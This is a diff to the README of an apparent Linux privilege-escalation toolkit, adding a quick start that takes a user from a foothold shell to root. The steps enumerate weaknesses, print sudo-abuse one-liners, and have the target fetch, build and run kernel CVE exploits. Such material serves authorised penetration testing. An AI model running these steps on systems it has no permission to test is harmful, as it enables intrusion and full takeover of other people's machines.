@@ -1,6 +1,33 @@
 # Linux privesc toolkit — the Potato-toolkit analog
 
-**Foothold shell on a Linux target · attacker 10.0.0.10 · goal: root.** Two buckets, mirroring the two Windows Potato archetypes.
+**Foothold shell on a Linux target · goal: root.**
+
+## 🚀 5-minute quick start — is there an easy root here?
+
+Beginner path — one script, no config to edit. From your foothold shell on target:
+
+```bash
+# 1) triage everything read-only (safe):
+sh enum.sh            # prints ==> gen_XXX.py next to EVERY applicable route
+
+# 2) work the ==> lines top-down. GTFO abuses are instant, no risk:
+python3 gtfo.py --scan "$(sudo -l 2>/dev/null)"   # on attacker: names the sudo abuse per rule
+python3 gtfo.py <binary> sudo                     # or just: python3 gtfo.py find
+# paste the printed one-liner on target -> shell as root
+
+# 3) if only kernel CVEs match (no misconfig win), pick the applicable one:
+python3 gen_exploit.py list                       # every PoC + applicability
+python3 gen_exploit.py <name> --fetch             # target curls the source, builds, runs
+# a wrong-build kernel PoC can BSOD -- snapshot + sign-off first.
+```
+
+**Two orders of preference:**
+1. **BUCKET 1 first** (SUID, sudo, capabilities, groups) — instant, can't crash the box.
+2. **BUCKET 2 second** (kernel/glibc/pkexec/sudo CVE PoC) — needs the exact matching version, some are unstable.
+
+`enum.sh` prints a **FINDINGS SUMMARY** at the bottom tallying every applicable vector. **Exploit the safest first, but document ALL** for an assessment (each `==>` is a separate finding).
+
+## Two buckets — mirroring the two Windows Potato archetypes
 
 ```
 Windows                         Linux
